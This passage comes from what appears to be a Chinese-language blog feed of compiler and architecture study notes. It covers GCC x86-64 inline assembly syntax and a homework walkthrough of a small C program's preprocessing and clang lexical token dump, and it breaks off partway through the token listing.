<p><img src="/img/mypic/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/image-20240909204004991.png" alt="image-20240909204004991"></p>
<h3 id="2-1文法分析（语法制导的翻译方案）（为语法制导的定义的一种实现）"><a href="#2-1文法分析（语法制导的翻译方案）（为语法制导的定义的一种实现）" class="headerlink" title="2.1文法分析（语法制导的翻译方案）（为语法制导的定义的一种实现）"></a>2.1文法分析（语法制导的翻译方案）（为语法制导的定义的一种实现）</h3><blockquote>
<p>2小节已给出例子</p>
</blockquote>
<p><img src="/img/mypic/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/image-20240909214050071.png" alt="image-20240909214050071"></p>
]]></content>
      <categories>
        <category>compiler</category>
      </categories>
      <tags>
        <tag>compiler</tag>
      </tags>
  </entry>
  <entry>
    <title>x86-64内联汇编</title>
    <url>/2024/08/30/%E6%9E%B6%E6%9E%84/x86-64%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/</url>
    <content><![CDATA[<p>总结：<a href="https://gcc.gnu.org/onlinedocs/gcc-14.2.0/gcc/Using-Assembly-Language-with-C.html">https://gcc.gnu.org/onlinedocs/gcc-14.2.0/gcc/Using-Assembly-Language-with-C.html</a></p>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p><strong>基本的 <code>asm</code> 语句</strong>：这是没有操作数的汇编语句（参见 Basic Asm - Assembler Instructions Without Operands）。它用于直接插入汇编代码，而不需要与 C 代码中的变量或表达式进行交互。</p>
<p><strong>扩展的 <code>asm</code> 语句</strong>：这种语句包括一个或多个操作数（参见 Extended Asm - Assembler Instructions with C Expression Operands）。扩展形式允许你将 C 语言中的表达式与汇编代码进行混合使用，使得在一个函数中可以更好地结合 C 语言和汇编语言。这种形式通常是更优选的。</p>
<h2 id="basic-asm"><a href="#basic-asm" class="headerlink" title="basic_asm"></a>basic_asm</h2><h3 id="形式"><a href="#形式" class="headerlink" title="形式"></a>形式</h3><blockquote>
<p>因为gcc扩展的原因，做好写为：<code>__asm__</code>的形式</p>
<h4 id="qualifiers："><a href="#qualifiers：" class="headerlink" title="qualifiers："></a>qualifiers：</h4><p>The optional <code>volatile</code> qualifier has no effect. All basic <code>asm</code> blocks are implicitly volatile.防止代码优化，但是没啥用</p>
<p>inline：貌似没有啥大用</p>
<h4 id="Parameters：汇编指令"><a href="#Parameters：汇编指令" class="headerlink" title="Parameters：汇编指令"></a>Parameters：汇编指令</h4></blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span> <span class="keyword">asm</span>-qualifiers ( AssemblerInstructions )</span><br><span class="line">__asm__ <span class="keyword">asm</span>-qualifiers ( AssemblerInstructions )</span><br></pre></td></tr></table></figure>

<h2 id="extend-asm"><a href="#extend-asm" class="headerlink" title="extend_asm"></a>extend_asm</h2><h3 id="形式-1"><a href="#形式-1" class="headerlink" title="形式"></a>形式</h3><blockquote>
<h4 id="qualifiers：多个个goto标签"><a href="#qualifiers：多个个goto标签" class="headerlink" title="qualifiers：多个个goto标签"></a>qualifiers：多个个goto标签</h4><h4 id="OutputOperands：c变量，由指令修改"><a href="#OutputOperands：c变量，由指令修改" class="headerlink" title="OutputOperands：c变量，由指令修改"></a>OutputOperands：c变量，由指令修改</h4><h4 id="InputOperands：c变量，输入到指令"><a href="#InputOperands：c变量，输入到指令" class="headerlink" title="InputOperands：c变量，输入到指令"></a>InputOperands：c变量，输入到指令</h4><h4 id="Clobbers：更改的寄存器列表"><a href="#Clobbers：更改的寄存器列表" class="headerlink" title="Clobbers：更改的寄存器列表"></a>Clobbers：更改的寄存器列表</h4><h4 id="GotoLabels：可以跳到的范围"><a href="#GotoLabels：可以跳到的范围" class="headerlink" title="GotoLabels：可以跳到的范围"></a><em>GotoLabels</em>：可以跳到的范围</h4><p>注意：输入+输出+goto操作数的总数限制为30。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asm asm-qualifiers ( AssemblerTemplate </span><br><span class="line">                      : OutputOperands</span><br><span class="line">                      : InputOperands</span><br><span class="line">                      : Clobbers</span><br><span class="line">                      : GotoLabels)</span><br></pre></td></tr></table></figure>

<h3 id="Special-format-strings-¶"><a href="#Special-format-strings-¶" class="headerlink" title="Special format strings ¶"></a>Special format strings<a href="https://gcc.gnu.org/onlinedocs/gcc-14.2.0/gcc/Extended-Asm.html#Special-format-strings"> ¶</a></h3><h3 id="OutputOperands"><a href="#OutputOperands" class="headerlink" title="OutputOperands"></a>OutputOperands</h3><blockquote>
<p><strong>输出约束必须以 <code>=</code> 或 <code>+</code> 开头</strong>：</p>
<p>**<code>=</code>**：表示这个操作数是一个纯输出操作数，即汇编代码会将新的值写入这个操作数，覆盖其原有的内容。编译器会将这个操作数视为新的输出，不会依赖它在汇编代码执行前的值。</p>
<p>**<code>+</code>**：表示这个操作数既是输入又是输出。汇编代码会读取这个操作数的原始值，并且在执行后将新的值写回操作数中。</p>
<p>约束为了让编译器做出正确的行为</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[ [asmSymbolicName] ] constraint (cvariablename)</span><br></pre></td></tr></table></figure>

<h3 id="InputOperands"><a href="#InputOperands" class="headerlink" title="InputOperands"></a>InputOperands</h3><blockquote>
<p>和输出操作数差不多，不同的是约束不能以&#x3D;与+开头</p>
</blockquote>
]]></content>
      <categories>
        <category>架构</category>
        <category>x86-64</category>
      </categories>
      <tags>
        <tag>架构</tag>
        <tag>x86-64</tag>
      </tags>
  </entry>
  <entry>
    <title>作业1</title>
    <url>/2024/09/15/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E4%BD%9C%E4%B8%9A1/</url>
    <content><![CDATA[<h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><h2 id="c-示例"><a href="#c-示例" class="headerlink" title="c++示例"></a>c++示例</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PI 3.14159265358979323846</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxValue = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> globalVar = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">square</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printResult</span><span class="params">(<span class="type">double</span> radius)</span> &#123;</span><br><span class="line">    <span class="type">double</span> area = PI * square(radius);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Area of the circle with radius %.2f is %.2f\n&quot;</span>, radius, area);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">double</span> radius = <span class="number">5.0</span>;</span><br><span class="line">    printResult(radius);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; maxValue; i++) &#123;</span><br><span class="line">        globalVar += i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Final globalVar value: %d\n&quot;</span>, globalVar);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1预处理"><a href="#1预处理" class="headerlink" title="1预处理"></a>1预处理</h3><blockquote>
<p>主要涉及到：1.头文件展开，基本上就是copy，头文件中包含了外部函数的声明，和一些结构体的定义。</p>
<p>2.宏替换（copy）</p>
</blockquote>
<blockquote>
<p>sh：</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">cpp ex.c -o example.i</span><br><span class="line"><span class="comment">## 扩展</span></span><br><span class="line">cpp -DPI=3.14 example.c -o example.i</span><br><span class="line">cpp -nostdinc example.c -o example.i</span><br><span class="line">cpp -dM example.c</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<blockquote>
<p>处理结果</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*头文件部分</span></span><br><span class="line"><span class="comment">*预处理器在处理头文件和代码时生成的注释，用来跟踪源代码中每个部分的来源。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"># <span class="number">0</span> <span class="string">&quot;ex.c&quot;</span></span><br><span class="line">....................................................................................</span><br><span class="line"># <span class="number">1</span> <span class="string">&quot;/usr/include/x86_64-linux-gnu/gnu/stubs-64.h&quot;</span> <span class="number">1</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"># <span class="number">11</span> <span class="string">&quot;/usr/include/x86_64-linux-gnu/gnu/stubs.h&quot;</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"># <span class="number">511</span> <span class="string">&quot;/usr/include/features.h&quot;</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"># <span class="number">34</span> <span class="string">&quot;/usr/include/x86_64-linux-gnu/bits/libc-header-start.h&quot;</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"># <span class="number">28</span> <span class="string">&quot;/usr/include/stdio.h&quot;</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"></span><br><span class="line">....................................................................................</span><br><span class="line"><span class="comment">/*头文件部分</span></span><br><span class="line"><span class="comment">*库结构体定义</span></span><br><span class="line"><span class="comment">*以iofile为例，这个就是库中的输入输出的底层实现的结构体</span></span><br><span class="line"><span class="comment">*其中包含这缓冲区指针等等。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> __<span class="title">FILE</span>;</span></span><br><span class="line"># <span class="number">42</span> <span class="string">&quot;/usr/include/stdio.h&quot;</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"># <span class="number">1</span> <span class="string">&quot;/usr/include/x86_64-linux-gnu/bits/types/FILE.h&quot;</span> <span class="number">1</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span>；</span></span><br><span class="line"><span class="class"><span class="title">typedef</span> <span class="keyword">struct</span> _<span class="title">IO_FILE</span> <span class="title">FILE</span>;</span></span><br><span class="line"># <span class="number">43</span> <span class="string">&quot;/usr/include/stdio.h&quot;</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"># <span class="number">1</span> <span class="string">&quot;/usr/include/x86_64-linux-gnu/bits/types/struct_FILE.h&quot;</span> <span class="number">1</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"># <span class="number">35</span> <span class="string">&quot;/usr/include/x86_64-linux-gnu/bits/types/struct_FILE.h&quot;</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">void</span> _IO_lock_t;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;</span><br><span class="line">  <span class="type">char</span> *_IO_read_end;</span><br><span class="line">  <span class="type">char</span> *_IO_read_base;</span><br><span class="line">  <span class="type">char</span> *_IO_write_base;</span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;</span><br><span class="line">  <span class="type">char</span> *_IO_write_end;</span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;</span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *_IO_save_base;</span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;</span><br><span class="line">  <span class="type">char</span> *_IO_save_end;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="type">__off_t</span> _old_offset;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;;</span><br><span class="line">....................................................................................</span><br><span class="line"><span class="comment">/*一些函数声明*/</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">remove</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *__filename)</span> __<span class="title function_">attribute__</span> <span class="params">((__nothrow__ , __leaf__))</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">rename</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *__old, <span class="type">const</span> <span class="type">char</span> *__new)</span> __<span class="title function_">attribute__</span> <span class="params">((__nothrow__ , __leaf__))</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">renameat</span> <span class="params">(<span class="type">int</span> __oldfd, <span class="type">const</span> <span class="type">char</span> *__old, <span class="type">int</span> __newfd,</span></span><br><span class="line"><span class="params">       <span class="type">const</span> <span class="type">char</span> *__new)</span> __<span class="title function_">attribute__</span> <span class="params">((__nothrow__ , __leaf__))</span>;</span><br><span class="line"># <span class="number">178</span> <span class="string">&quot;/usr/include/stdio.h&quot;</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">fclose</span> <span class="params">(FILE *__stream)</span>;</span><br><span class="line"># <span class="number">188</span> <span class="string">&quot;/usr/include/stdio.h&quot;</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"><span class="keyword">extern</span> FILE *<span class="title function_">tmpfile</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">  __<span class="title function_">attribute__</span> <span class="params">((__malloc__))</span> __<span class="title function_">attribute__</span> <span class="params">((__malloc__ (fclose, <span class="number">1</span>)))</span> ;</span><br><span class="line"># <span class="number">205</span> <span class="string">&quot;/usr/include/stdio.h&quot;</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> *<span class="title function_">tmpnam</span> <span class="params">(<span class="type">char</span>[<span class="number">20</span>])</span> __<span class="title function_">attribute__</span> <span class="params">((__nothrow__ , __leaf__))</span> ;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> *<span class="title function_">tmpnam_r</span> <span class="params">(<span class="type">char</span> __s[<span class="number">20</span>])</span> __<span class="title function_">attribute__</span> <span class="params">((__nothrow__ , __leaf__))</span> ;</span><br><span class="line"># <span class="number">222</span> <span class="string">&quot;/usr/include/stdio.h&quot;</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> *<span class="title function_">tempnam</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *__dir, <span class="type">const</span> <span class="type">char</span> *__pfx)</span></span><br><span class="line">   __<span class="title function_">attribute__</span> <span class="params">((__nothrow__ , __leaf__))</span> __<span class="title function_">attribute__</span> <span class="params">((__malloc__))</span> __<span class="title function_">attribute__</span> <span class="params">((__malloc__ (__builtin_free, <span class="number">1</span>)))</span>;</span><br><span class="line">....................................................................................</span><br><span class="line"><span class="comment">/*主程序逻辑*/</span></span><br><span class="line"># <span class="number">6</span> <span class="string">&quot;ex.c&quot;</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxValue = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> globalVar = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">square</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printResult</span><span class="params">(<span class="type">double</span> radius)</span> &#123;</span><br><span class="line">    <span class="type">double</span> area = <span class="number">3.14159265358979323846</span> * square(radius);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Area of the circle with radius %.2f is %.2f\n&quot;</span>, radius, area);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">double</span> radius = <span class="number">5.0</span>;</span><br><span class="line">    printResult(radius);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; maxValue; i++) &#123;</span><br><span class="line">        globalVar += i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Final globalVar value: %d\n&quot;</span>, globalVar);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2词法分析"><a href="#2词法分析" class="headerlink" title="2词法分析"></a>2词法分析</h3><blockquote>
<p>主要是用于token流的生成，为了后续的ast的实现</p>
<p><strong>[StartOfLine]</strong> 和 **[LeadingSpace]**：</p>
<ul>
<li>这些标签表示该 token 是否位于行首，或者其前面是否有空格。</li>
</ul>
<p><strong>Loc</strong>：</p>
<ul>
<li>表示 token 的来源文件和具体的行、列位置，帮助追踪每个 token 在源文件中的位置，方便调试或分析。</li>
</ul>
<p><strong>Spelling</strong>：</p>
<ul>
<li><code>Spelling=&lt;built-in&gt;</code> 表示该 token 是来自于编译器的内置定义，而不是用户代码中的内容。例如，<code>size_t</code>、<code>__builtin_va_list</code> 都是标准库或内置类型。</li>
</ul>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//clang -Xclang -dump-tokens -fsyntax-only ex.c &gt; mytoken 2&gt;&amp;1</span><br><span class="line">头文件的一些词法</span><br><span class="line">.....................</span><br><span class="line">const &#x27;const&#x27;	 [StartOfLine]	Loc=&lt;ex.c:6:1&gt;</span><br><span class="line">int &#x27;int&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:6:7&gt;</span><br><span class="line">identifier &#x27;maxValue&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:6:11&gt;</span><br><span class="line">equal &#x27;=&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:6:20&gt;</span><br><span class="line">numeric_constant &#x27;100&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:6:22&gt;</span><br><span class="line">semi &#x27;;&#x27;		Loc=&lt;ex.c:6:25&gt;</span><br><span class="line">int &#x27;int&#x27;	 [StartOfLine]	Loc=&lt;ex.c:8:1&gt;</span><br><span class="line">identifier &#x27;globalVar&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:8:5&gt;</span><br><span class="line">equal &#x27;=&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:8:15&gt;</span><br><span class="line">numeric_constant &#x27;10&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:8:17&gt;</span><br><span class="line">semi &#x27;;&#x27;		Loc=&lt;ex.c:8:19&gt;</span><br><span class="line">int &#x27;int&#x27;	 [StartOfLine]	Loc=&lt;ex.c:10:1&gt;</span><br><span class="line">identifier &#x27;square&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:10:5&gt;</span><br><span class="line">l_paren &#x27;(&#x27;		Loc=&lt;ex.c:10:11&gt;</span><br><span class="line">int &#x27;int&#x27;		Loc=&lt;ex.c:10:12&gt;</span><br><span class="line">identifier &#x27;x&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:10:16&gt;</span><br><span class="line">r_paren &#x27;)&#x27;		Loc=&lt;ex.c:10:17&gt;</span><br><span class="line">l_brace &#x27;&#123;&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:10:19&gt;</span><br><span class="line">return &#x27;return&#x27;	 [StartOfLine] [LeadingSpace]	Loc=&lt;ex.c:11:5&gt;</span><br><span class="line">identifier &#x27;x&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:11:12&gt;</span><br><span class="line">star &#x27;*&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:11:14&gt;</span><br><span class="line">identifier &#x27;x&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:11:16&gt;</span><br><span class="line">semi &#x27;;&#x27;		Loc=&lt;ex.c:11:17&gt;</span><br><span class="line">r_brace &#x27;&#125;&#x27;	 [StartOfLine]	Loc=&lt;ex.c:12:1&gt;</span><br><span class="line">void &#x27;void&#x27;	 [StartOfLine]	Loc=&lt;ex.c:14:1&gt;</span><br><span class="line">identifier &#x27;printResult&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:14:6&gt;</span><br><span class="line">l_paren &#x27;(&#x27;		Loc=&lt;ex.c:14:17&gt;</span><br><span class="line">double &#x27;double&#x27;		Loc=&lt;ex.c:14:18&gt;</span><br><span class="line">identifier &#x27;radius&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:14:25&gt;</span><br><span class="line">r_paren &#x27;)&#x27;		Loc=&lt;ex.c:14:31&gt;</span><br><span class="line">l_brace &#x27;&#123;&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:14:33&gt;</span><br><span class="line">double &#x27;double&#x27;	 [StartOfLine] [LeadingSpace]	Loc=&lt;ex.c:15:5&gt;</span><br><span class="line">identifier &#x27;area&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:15:12&gt;</span><br><span class="line">equal &#x27;=&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:15:17&gt;</span><br><span class="line">numeric_constant &#x27;3.14159265358979323846&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:15:19 &lt;Spelling=ex.c:4:12&gt;&gt;</span><br><span class="line">star &#x27;*&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:15:22&gt;</span><br><span class="line">identifier &#x27;square&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:15:24&gt;</span><br><span class="line">l_paren &#x27;(&#x27;		Loc=&lt;ex.c:15:30&gt;</span><br><span class="line">identifier &#x27;radius&#x27;		Loc=&lt;ex.c:15:31&gt;</span><br><span class="line">r_paren &#x27;)&#x27;		Loc=&lt;ex.c:15:37&gt;</span><br><span class="line">semi &#x27;;&#x27;		Loc=&lt;ex.c:15:38&gt;</span><br><span class="line">identifier &#x27;printf&#x27;	 [StartOfLine] [LeadingSpace]	Loc=&lt;ex.c:16:5&gt;</span><br><span class="line">l_paren &#x27;(&#x27;		Loc=&lt;ex.c:16:11&gt;</span><br><span class="line">string_literal &#x27;&quot;Area of the circle with radius %.2f is %.2f\n&quot;&#x27;		Loc=&lt;ex.c:16:12&gt;</span><br><span class="line">comma &#x27;,&#x27;		Loc=&lt;ex.c:16:59&gt;</span><br><span class="line">identifier &#x27;radius&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:16:61&gt;</span><br><span class="line">comma &#x27;,&#x27;		Loc=&lt;ex.c:16:67&gt;</span><br><span class="line">identifier &#x27;area&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:16:69&gt;</span><br><span class="line">r_paren &#x27;)&#x27;		Loc=&lt;ex.c:16:73&gt;</span><br><span class="line">semi &#x27;;&#x27;		Loc=&lt;ex.c:16:74&gt;</span><br><span class="line">r_brace &#x27;&#125;&#x27;	 [StartOfLine]	Loc=&lt;ex.c:17:1&gt;</span><br><span class="line">int &#x27;int&#x27;	 [StartOfLine]	Loc=&lt;ex.c:19:1&gt;</span><br><span class="line">identifier &#x27;main&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:19:5&gt;</span><br><span class="line">l_paren &#x27;(&#x27;		Loc=&lt;ex.c:19:9&gt;</span><br><span class="line">r_paren &#x27;)&#x27;		Loc=&lt;ex.c:19:10&gt;</span><br><span class="line">l_brace &#x27;&#123;&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:19:12&gt;</span><br><span class="line">double &#x27;double&#x27;	 [StartOfLine] [LeadingSpace]	Loc=&lt;ex.c:20:5&gt;</span><br><span class="line">identifier &#x27;radius&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:20:12&gt;</span><br><span class="line">equal &#x27;=&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:20:19&gt;</span><br><span class="line">numeric_constant &#x27;5.0&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:20:21&gt;</span><br><span class="line">semi &#x27;;&#x27;		Loc=&lt;ex.c:20:24&gt;</span><br><span class="line">identifier &#x27;printResult&#x27;	 [StartOfLine] [LeadingSpace]	Loc=&lt;ex.c:21:5&gt;</span><br><span class="line">l_paren &#x27;(&#x27;		Loc=&lt;ex.c:21:16&gt;</span><br><span class="line">identifier &#x27;radius&#x27;		Loc=&lt;ex.c:21:17&gt;</span><br><span class="line">r_paren &#x27;)&#x27;		Loc=&lt;ex.c:21:23&gt;</span><br><span class="line">semi &#x27;;&#x27;		Loc=&lt;ex.c:21:24&gt;</span><br><span class="line">for &#x27;for&#x27;	 [StartOfLine] [LeadingSpace]	Loc=&lt;ex.c:23:5&gt;</span><br><span class="line">l_paren &#x27;(&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:23:9&gt;</span><br><span class="line">int &#x27;int&#x27;		Loc=&lt;ex.c:23:10&gt;</span><br><span class="line">identifier &#x27;i&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:23:14&gt;</span><br><span class="line">equal &#x27;=&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:23:16&gt;</span><br><span class="line">numeric_constant &#x27;0&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:23:18&gt;</span><br><span class="line">semi &#x27;;&#x27;		Loc=&lt;ex.c:23:19&gt;</span><br><span class="line">identifier &#x27;i&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:23:21&gt;</span><br><span class="line">less &#x27;&lt;&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:23:23&gt;</span><br><span class="line">identifier &#x27;maxValue&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:23:25&gt;</span><br><span class="line">semi &#x27;;&#x27;		Loc=&lt;ex.c:23:33&gt;</span><br><span class="line">identifier &#x27;i&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:23:35&gt;</span><br><span class="line">plusplus &#x27;++&#x27;		Loc=&lt;ex.c:23:36&gt;</span><br><span class="line">r_paren &#x27;)&#x27;		Loc=&lt;ex.c:23:38&gt;</span><br><span class="line">l_brace &#x27;&#123;&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:23:40&gt;</span><br><span class="line">identifier &#x27;globalVar&#x27;	 [StartOfLine] [LeadingSpace]	Loc=&lt;ex.c:24:9&gt;</span><br><span class="line">plusequal &#x27;+=&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:24:19&gt;</span><br><span class="line">identifier &#x27;i&#x27;	 [LeadingSpace]	Loc=&lt;ex.c:24:22&gt;</span><br><span class="line">semi &#x27;;&#x27;		Loc=&lt;ex.c:24:23&gt;</span><br><span class="line">r_brace &#x27;&#125;&#x27;	 [StartOfLine] [LeadingSpace]	Loc=&lt;ex.c:25:5&gt;</span><br><span class="line">identifier &#x27;printf&#x27;	 [StartOfLine] [LeadingSpace]	Loc=&lt;ex.c:26:5&gt;</span><br><span class="line">l_paren &#x27;(&#x27;		Loc=&lt;ex.c:26:11&gt;</span><br><span class="line">string_literal &#x27;&quot;Final globalVar value: %d\n&quot;&#x27;		Loc=&lt;ex.c:26:12&gt;</span><br><span class="line">comma &#x27;,&#x27;		